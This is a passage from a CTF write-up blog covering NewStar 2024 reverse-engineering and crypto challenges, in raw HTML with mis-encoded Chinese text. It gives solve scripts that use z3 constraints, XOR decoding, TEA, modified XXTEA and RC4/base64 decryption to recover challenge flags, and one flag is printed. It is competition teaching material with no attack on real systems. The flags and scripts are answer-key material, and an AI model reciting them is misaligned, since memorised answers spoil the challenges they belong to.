src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728885997170-be5d1767-d357-4e91-88cb-8c6df03fd85f-173008049582713.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> libnum<br>v2=BitVec(<span class="hljs-string">&#x27;v2&#x27;</span>,<span class="hljs-number">32</span>)<br>v3=BitVec(<span class="hljs-string">&#x27;v3&#x27;</span>,<span class="hljs-number">32</span>)<br>v4=BitVec(<span class="hljs-string">&#x27;v4&#x27;</span>,<span class="hljs-number">32</span>)<br>v5=BitVec(<span class="hljs-string">&#x27;v5&#x27;</span>,<span class="hljs-number">32</span>)<br>v6=BitVec(<span class="hljs-string">&#x27;v6&#x27;</span>,<span class="hljs-number">32</span>)<br>v7=BitVec(<span class="hljs-string">&#x27;v7&#x27;</span>,<span class="hljs-number">32</span>)<br>v8=BitVec(<span class="hljs-string">&#x27;v8&#x27;</span>,<span class="hljs-number">32</span>)<br><br>sovler=Solver()<br>a=[]<br>sovler.add(<span class="hljs-number">5</span> * (v3 + v2) + <span class="hljs-number">4</span> * v4 + <span class="hljs-number">6</span> * v5 + v6 + <span class="hljs-number">9</span> * v8 + <span class="hljs-number">2</span> * v7==<span class="hljs-number">0xD5CC7D4FF</span>)<br>sovler.add(<span class="hljs-number">4</span> * v8 + <span class="hljs-number">3</span> * v5 + <span class="hljs-number">6</span> * v4 + <span class="hljs-number">10</span> * v3 + <span class="hljs-number">9</span> * v2 + <span class="hljs-number">9</span> * v7 + <span class="hljs-number">3</span> * v6==<span class="hljs-number">0x102335844B</span>)<br>sovler.add(<span class="hljs-number">9</span> * v6 + <span class="hljs-number">4</span> * (v5 + v4) + <span class="hljs-number">5</span> * v3 + <span class="hljs-number">4</span> * v2 + <span class="hljs-number">3</span> * v8 + <span class="hljs-number">10</span> * v7==<span class="hljs-number">0xD55AEABB9</span>)<br>sovler.add(<span class="hljs-number">9</span> * v3 + <span class="hljs-number">5</span> * v2 + <span class="hljs-number">9</span> * v8 + <span class="hljs-number">2</span> * (v4 + <span class="hljs-number">2</span> * v5 + <span class="hljs-number">5</span> * v6 + v7)==<span class="hljs-number">0xF89F6B7FA</span>)<br>sovler.add(<span class="hljs-number">5</span> * v6 + <span class="hljs-number">9</span> * v5 + <span class="hljs-number">7</span> * v2 + <span class="hljs-number">2</span> * v3 + v4 + <span class="hljs-number">3</span> * v8 + <span class="hljs-number">9</span> * v7==<span class="hljs-number">0xD5230B80B</span>)<br>sovler.add(<span class="hljs-number">8</span> * v8 + <span class="hljs-number">6</span> * v5 + <span class="hljs-number">10</span> * v4 + <span class="hljs-number">5</span> * v3 + <span class="hljs-number">6</span> * v2 + <span class="hljs-number">3</span> * v7 + <span class="hljs-number">9</span> * v6==<span class="hljs-number">0x11E28ED873</span>)<br>sovler.add(v2 + <span class="hljs-number">4</span> * (v4 + v3 + <span class="hljs-number">2</span> * v5) + <span class="hljs-number">9</span> * v6 + v7 + <span class="hljs-number">3</span> * v8 == <span class="hljs-number">0xB353C03E1</span>)<br><span class="hljs-keyword">if</span> sovler.check()==sat:<br>    model=sovler.model()<br>    <span class="hljs-built_in">print</span>(libnum.n2s(model[v2].as_long())[::-<span class="hljs-number">1</span>].decode(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(libnum.n2s(model[v3].as_long())[::-<span class="hljs-number">1</span>].decode(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(libnum.n2s(model[v4].as_long())[::-<span class="hljs-number">1</span>].decode(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(libnum.n2s(model[v5].as_long())[::-<span class="hljs-number">1</span>].decode(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(libnum.n2s(model[v6].as_long())[::-<span class="hljs-number">1</span>].decode(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(libnum.n2s(model[v7].as_long())[::-<span class="hljs-number">1</span>].decode(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(libnum.n2s(model[v8].as_long())[::-<span class="hljs-number">1</span>].decode(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="wtf"><a href="#wtf" class="headerlink" title="wtf"></a>wtf</h3><p>äº¤å‰å¼•ç”¨inputéƒ½ä¸‹å¥½æ–­ç‚¹ï¼Œç„¶åè°ƒè¯•è¿è¡Œçœ‹ç¨‹åºé€»è¾‘ï¼Œå‘ç°å…ˆ-0xe9å†^i</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728887580659-6c62defc-51fa-49ca-9abf-4073fd14af66-173008049582715.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0x4F</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x41</span>,<br>  <span class="hljs-number">0x26</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3B</span>,<br>  <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x70</span>]<br>s=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>  a[i]=a[i]^i<br>  s+=<span class="hljs-built_in">chr</span>((a[i]-<span class="hljs-number">0xe9</span>)%<span class="hljs-number">256</span>)<br><span class="hljs-built_in">print</span>(s)<br></code></pre></td></tr></table></figure><h3 id="011vm"><a href="#011vm" class="headerlink" title="011vm"></a>011vm</h3><p>ç”¨d810å»æ··æ·†ä½†ä¸å®Œå…¨</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728889707348-55a2f455-2123-47a2-bf01-42e3fe7b3543-173008049582717.png" class="" title="img"><p>è¿›å…¥3b30ï¼Œä¸€ä¸ªæ‰“å°ä¸€ä¸ªteaï¼Œæ‰¾åˆ°teaçš„æ‰€æœ‰å‚æ•°ï¼Œå‰åä¸€ä¸€å¯¹åº”</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728889970695-8645eadd-ba24-4185-a00d-cfc483e809e4-173008049582719.png" class="" title="img"><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728889691026-4e86b5cf-3890-4b7d-8940-d946bad62f07-173008049582721.png" class="" title="img"><p>ä¸Šé¢æ˜¯å¯†é’¥ï¼Œä¸‹é¢æ˜¯å¯†æ–‡</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728889636547-9cd094cb-7497-42dc-bff6-6bdae2144603-173008049582723.png" class="" title="img"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], sum=<span class="hljs-number">0</span>, i; <span class="hljs-comment">/* set up */</span><br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">0x9E3779B9</span>;<br>    <span class="hljs-type">uint32_t</span> v2[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">0x3D121D26</span>, <span class="hljs-number">0x5E6189F9</span>&#125;, v3[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">0xC1FB278E</span>, <span class="hljs-number">0x3B494648</span>&#125;, v5[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0x38B97E28</span>,<span class="hljs-number">0xB7E510C1</span>,<span class="hljs-number">0xB4B29FAE</span>,<span class="hljs-number">0x5593BBD7</span>,<span class="hljs-number">0x3C2E9B9E</span>,<span class="hljs-number">0x1671C637</span>,<span class="hljs-number">0x8F3A8CB5</span>,<span class="hljs-number">0x5116E515</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x11121314</span>,<span class="hljs-number">0x22232425</span>,<span class="hljs-number">0x33343536</span>,<span class="hljs-number">0x41424344</span>&#125;, l = <span class="hljs-number">0</span>, r = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> m=<span class="hljs-number">0</span>;m&lt;<span class="hljs-number">8</span>;m+=<span class="hljs-number">2</span>)&#123;<br>sum = delta*(<span class="hljs-number">32</span>);<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        v5[m + <span class="hljs-number">1</span>] -= ((v5[m] &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v5[m] + sum) ^ ((v5[m] &gt;&gt; <span class="hljs-number">5</span>) + k3);<br>        v5[m] -= ((v5[m + <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v5[m + <span class="hljs-number">1</span>] + sum) ^ ((v5[m + <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">5</span>) + k1);<br>        sum -= delta;<br>    &#125;     <br>&#125; <br><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (v5[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="flowering-shrubs"><a href="#flowering-shrubs" class="headerlink" title="flowering_shrubs"></a>flowering_shrubs</h3><p>é™æ€å»èŠ±æŒ‡ä»¤å‘ç°æ˜¯å‡½æ•°åµŒå¥—å‡½æ•°ï¼Œå“äº†ä¸€è·³ï¼Œæœæ–­é€‰æ‹©åŠ¨æ€ï¼Œå‘ç°è¿˜æ˜¯ä¸€æ ·</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728903450698-3e1a6b8c-7b6f-4d91-81a2-008992f3f637-173008049582725.png" class="" title="img"><p>å¯†æ–‡ä¸€æ¬¡å¾ªç¯å˜åŒ–å››ä½ï¼Œé€»è¾‘åœ¨ä¸Šé¢</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728903840218-727b0b2b-4812-4598-a3d7-2b5261f91a51-173008049582827.png" class="" title="img"><p>è°ƒè¯•å‡ºå¯¹åº”å…³ç³»ï¼Œè¿™æ ·å°±ä¸ç”¨ç®¡éšæœºæ•°äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0-&gt;u</span><br><span class="hljs-string">1-&gt;a</span><br><span class="hljs-string">8-&gt;r</span><br><span class="hljs-string">3-&gt;e</span><br><span class="hljs-string">2-&gt;f</span><br><span class="hljs-string">6-&gt;i</span><br><span class="hljs-string">4-&gt;r</span><br><span class="hljs-string">5-&gt;s</span><br><span class="hljs-string">7-&gt;t</span><br><span class="hljs-string">9-&gt;.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>s=<span class="hljs-string">&#x27;uafersitr.&#x27;</span><br><br>a=[<span class="hljs-number">0x54</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xE0</span>,<br>   <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x39</span>,<br>   <span class="hljs-number">0x76</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0xC9</span>,<br>   <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x3E</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s)*<span class="hljs-number">4</span>,<span class="hljs-number">4</span>):<br>    a[i]=a[i]^a[i+<span class="hljs-number">3</span>]<br>    a[i+<span class="hljs-number">3</span>]^=a[i+<span class="hljs-number">2</span>]<br>    a[i+<span class="hljs-number">2</span>]=a[i+<span class="hljs-number">2</span>]+<span class="hljs-built_in">ord</span>(s[i//<span class="hljs-number">4</span>])<br>    a[i+<span class="hljs-number">2</span>]^=a[i+<span class="hljs-number">1</span>]<br>    a[i+<span class="hljs-number">1</span>]=a[i+<span class="hljs-number">1</span>]-<span class="hljs-built_in">ord</span>(s[i//<span class="hljs-number">4</span>])<br>    a[i+<span class="hljs-number">1</span>]^=a[i]<br>    a[i]^=<span class="hljs-built_in">ord</span>(s[i//<span class="hljs-number">4</span>])<br>    <span class="hljs-comment"># print(a)</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((a[i])%<span class="hljs-number">256</span>),end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((a[i+<span class="hljs-number">1</span>])%<span class="hljs-number">256</span>), end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((a[i+<span class="hljs-number">2</span>])%<span class="hljs-number">256</span>), end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((a[i+<span class="hljs-number">3</span>])%<span class="hljs-number">256</span>), end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment">#flag&#123;y0u_C4n_3a51ly_Rem0v3_CoNfu510n-!!&#125;</span><br></code></pre></td></tr></table></figure><h3 id="SecretsofKawayi"><a href="#SecretsofKawayi" class="headerlink" title="SecretsofKawayi"></a>SecretsofKawayi</h3><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1729043419776-25a4e284-f09d-49e5-be70-91ddc3184820-173008051395929.png" class="" title="img"><p>å…ˆrc4å†base64</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1729043442784-9b9a2b70-6299-4085-968e-1f4b20b1c4f9-173008051395931.png" class="" title="img"><p>soæ–‡ä»¶å…ˆè„±å£³ï¼Œå‘ç°æ˜¯é­”æ”¹xxtea</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1729043503402-3f034b51-e79a-4662-9b04-cfdbc34f1f72-173008051395933.png" class="" title="img"><p>æ³¨æ„è½®æ•°ä¸åç¼–è¯‘çš„ç»“æœä¸ä¸€æ ·</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0x21524111</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MX (((z&gt;&gt;5^y<span class="hljs-string">&lt;&lt;3) + (y&gt;</span>&gt;3^z&lt;&lt;2)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">btea</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v, <span class="hljs-type">int</span> n, <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">uint32_t</span> y, z, sum;<br>    <span class="hljs-type">unsigned</span> p, rounds, e;<br>    <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1</span>) &#123;         <br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = (-rounds)*DELTA;<br>        z = v[n - <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">do</span> &#123;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = n<span class="hljs-number">-1</span>; p &gt;<span class="hljs-number">0</span>; p--) &#123;<br>                y = v[p + <span class="hljs-number">1</span>];<br>                z = v[p] -= MX;<br>            &#125;<br>            y = v[<span class="hljs-number">0</span>];<br>            z = v[n - <span class="hljs-number">1</span>] -= MX;<br>            sum += DELTA;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">-1</span>) &#123;  <br>        n = -n;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = (-rounds) * DELTA;<br>        y = v[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">do</span> &#123;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = n - <span class="hljs-number">1</span>; p &gt; <span class="hljs-number">0</span>; p--) &#123;<br>                z = v[p - <span class="hljs-number">1</span>];<br>                y = v[p] -= MX;<br>            &#125;<br>            z = v[n - <span class="hljs-number">1</span>];<br>            y = v[<span class="hljs-number">0</span>] -= MX;<br>            sum += DELTA;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">12</span>] = &#123;<span class="hljs-number">0x8C12D3DF</span>, <span class="hljs-number">0x5F4C4137</span>, <span class="hljs-number">0x1A9D3D02</span>, <span class="hljs-number">0x2D1294B7</span>, <span class="hljs-number">0xFB622B37</span>, <span class="hljs-number">0xD18D84E3</span>, <span class="hljs-number">0x064C4592</span>, <span class="hljs-number">0x16985CAB</span>, <span class="hljs-number">0xFDB06D69</span>,<span class="hljs-number">0xFB30B1E3</span>,<span class="hljs-number">0x925C2FD3</span>,<span class="hljs-number">0x2E1BB40C</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x776F656D</span>, <span class="hljs-number">0x6F656D7E</span>, <span class="hljs-number">0x65747E77</span>, <span class="hljs-number">0x7E7E7E61</span>&#125;;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">12</span>;<span class="hljs-comment">//æ³¨æ„è¿™é‡Œä¸æ•°ç»„é•¿åº¦ç›¸ç­‰ </span><br>    btea(v, -n, k);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">12</span>; i ++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x,&quot;</span>, v[i]&amp;<span class="hljs-number">0xff</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x,&quot;</span>, v[i] &gt;&gt; <span class="hljs-number">8</span> &amp; <span class="hljs-number">0xff</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x,&quot;</span>, v[i] &gt;&gt; <span class="hljs-number">16</span> &amp; <span class="hljs-number">0xff</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x,&quot;</span>, v[i] &gt;&gt; <span class="hljs-number">24</span> &amp; <span class="hljs-number">0xff</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>import base64<br>def <span class="hljs-title function_">rc4</span><span class="hljs-params">(data, key)</span>:<br>    S = <span class="hljs-built_in">list</span>(range(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % len(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> <span class="hljs-type">char</span> in data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append(<span class="hljs-type">char</span> ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])<br><br>    <span class="hljs-keyword">return</span> bytes(out)<br><br><br>data = bytes([<span class="hljs-number">113</span>, <span class="hljs-number">71</span>, <span class="hljs-number">105</span>, <span class="hljs-number">111</span>, <span class="hljs-number">84</span>, <span class="hljs-number">56</span>, <span class="hljs-number">107</span>, <span class="hljs-number">115</span>, <span class="hljs-number">98</span>, <span class="hljs-number">118</span>, <span class="hljs-number">72</span>, <span class="hljs-number">105</span>, <span class="hljs-number">102</span>, <span class="hljs-number">105</span>, <span class="hljs-number">111</span>, <span class="hljs-number">77</span>, <span class="hljs-number">89</span>, <span class="hljs-number">100</span>, <span class="hljs-number">113</span>, <span class="hljs-number">47</span>, <span class="hljs-number">104</span>, <span class="hljs-number">66</span>, <span class="hljs-number">115</span>, <span class="hljs-number">112</span>, <span class="hljs-number">82</span>, <span class="hljs-number">76</span>, <span class="hljs-number">52</span>, <span class="hljs-number">67</span>, <span class="hljs-number">82</span>, <span class="hljs-number">122</span>, <span class="hljs-number">70</span>, <span class="hljs-number">86</span>, <span class="hljs-number">79</span>, <span class="hljs-number">47</span>, <span class="hljs-number">89</span>, <span class="hljs-number">98</span>, <span class="hljs-number">103</span>, <span class="hljs-number">78</span>, <span class="hljs-number">89</span>, <span class="hljs-number">100</span>, <span class="hljs-number">67</span>, <span class="hljs-number">103</span>, <span class="hljs-number">61</span>, <span class="hljs-number">61</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>])<br>key = b<span class="hljs-number">&#x27;</span>rc4k4y<span class="hljs-number">&#x27;</span><br><br><br>data=base64.b64decode(data)<br>decrypted = rc4(data, key)<br>print(decrypted)<br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="week2-1"><a href="#week2-1" class="headerlink" title="week2"></a>week2</h2><h3 id="èŒ¶é‡ŒèŒ¶æ°”"><a href="#èŒ¶é‡ŒèŒ¶æ°”" class="headerlink" title="èŒ¶é‡ŒèŒ¶æ°”"></a>èŒ¶é‡ŒèŒ¶æ°”</h3><p>&gt;&gt;å’Œteaçš„ç»“åˆ</p><p>å› 